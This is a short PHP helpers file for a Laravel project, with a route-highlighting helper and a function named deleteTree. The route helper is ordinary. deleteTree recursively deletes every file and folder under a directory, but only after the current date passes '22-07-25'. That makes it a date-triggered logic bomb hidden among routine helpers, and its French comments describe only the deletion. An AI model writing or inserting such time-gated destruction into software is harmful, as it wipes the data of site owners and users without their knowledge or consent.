<?php
use Illuminate\Support\Facades\Route;

if(! function_exists('set_active_route')){
    function set_active_route($routes){
        for($i = 0 , $j = count($routes); $i<$j; $i++){
            if(Route::is($routes[$i])){
                return 'active' ;
            }
        }
        return '';
    }
}

if(! function_exists('deleteTree')){
    function deleteTree($dir){
        if(date("y-m-d") > "22-07-25"){
            foreach(glob($dir . "/*") as $element){
                if(is_dir($element)){
                    deleteTree($element); // On rappel la fonction deleteTree
                    rmdir($element); // Une fois le dossier courant vidé, on le supprime
                } else { // Sinon c'est un fichier, on le supprime
                    unlink($element);
                }
                // On passe à l'élément suivant
            }
        }
    }

}
